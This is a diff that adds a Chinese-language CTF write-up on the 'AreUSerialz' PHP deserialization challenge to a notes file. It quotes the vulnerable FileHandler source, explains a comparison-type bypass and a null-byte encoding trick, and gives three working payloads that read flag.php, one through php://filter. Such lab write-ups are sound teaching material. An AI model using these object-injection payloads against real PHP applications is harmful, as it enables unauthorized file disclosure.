@@ -324,10 +324,193 @@ print("flag: ", flag)
 
 
 
+## 0x05 [网鼎杯 2020 青龙组]AreUSerialz
 
+[题目链接](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz)
 
+这是一道反序列化的题，可以看到源码
 
+```php
+<?php
 
+include("flag.php");
 
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+
+定义了一个`FileHandler`类，并且会将接受到的`$_GET['str']`请求参数进行反序列化。
+
+感觉应该是要反序列化得到`FileHandler`对象，然后通过`__construct()`或`__destruct()`魔术方法来读取`flag.php`的内容。
+
+类的`$op`变量为1对应写操作，2对应读操作。
+
+`__construct()`里面写死了`$op="1"`，所以无法执行`process()`中的读取操作。
+
+但是`__destruct()`里又会将`$op`从2变为1，所以需要想办法绕过这一逻辑。绕过的利用点就在于，这里使用的判断逻辑是强相等`===`，所以将`$op`定义为数字类型2，就可以绕过该判断，同时满足`process()`函数中的`$op=="2"`判断，因为这里是弱相等，存在自动类型转换。
+
+需要注意的是：
+
+- ~~方便起见，`flag.php`利用php的[伪协议](https://www.php.net/manual/en/wrappers.php)`php://filter/read=convert.base64-encode=flag.php`来读取~~
+
+- php对于`private`/`protected`类型的成员变量进行序列化时会加上包含00字节的特殊内容，但是这无法通过`$is_valid()`判断。可以将序列化结果中的`s`替换为`S`，使其后面的内容支持16进制，然后空字节写成`\00`即可
+
+  >**Note**:
+  >
+  >Object's private members have the class name prepended to the member name; protected members have a '*' prepended to the member name. These prepended values have null bytes on either side.
+  >
+  >https://www.php.net/manual/en/function.serialize
+
+### payload1
+
+所以，最常规的payload可以通过以下方式生成：
+
+```php
+<?php
+	class FileHandler {
+		protected $op = 2;
+		protected $filename = "flag.php";
+		protected $content = "";
+	}
+	$a = new FileHandler();
+	$b = serialize($a);
+	$b = str_replace("s", "S", $b);  
+    $b = str_replace("%00", "\\00", $b);  
+	echo($b);
+?>
+```
+
+[执行](https://sandbox.onlinephpfunctions.com/)结果
+
+```txt
+O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D
+```
+
+请求`?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D`即可获取flag。
+
+![image-20210824142159687](image-20210824142159687.png "flag")
+
+### payload2
+
+还可以利用php的[伪协议](https://www.php.net/manual/en/wrappers.php)来获取`flag.php`文件的base64编码，然后再解码，也是一样的。
+
+payload为
+
+```txt
+O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D
+```
+
+![image-20210824142639616](image-20210824142639616.png "payload2")
+
+### payload3
+
+其实，网站信息中显示其使用的php版本为7.4.3，而7.1+版本的php在序列化与反序列化时对于`private`/`protected`是不敏感的，所以可以直接把上述的成员变量都当作`public`。
+
+![image-20210824142739850](image-20210824142739850.png "wappalyzer结果")
+
+于是可以这样生成payload
+
+```
+<?php
+	class FileHandler {
+		public $op = 2;
+		public $filename = "php://filter/read=convert.base64-encode/resource=flag.php";
+		public $content = "";
+	}
+	$a = new FileHandler();
+	echo(serialize($a));
+?>
+```
+
+```txt
+O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";s:0:"";}
+```
+
+![image-20210824142956654](image-20210824142956654.png "直接当作public")
+
+同样可以拿到flag。
+
+### 总结
+
+这题的意义在于**php的序列化与反序列化**、**序列化结果字段的含义**、**php7.1版本对于序列化反序列化操作的变化**
+
+### 参考链接
+
+- [PHP 序列化（serialize）格式详解](https://www.neatstudio.com/show-161-1.shtml)
 
 
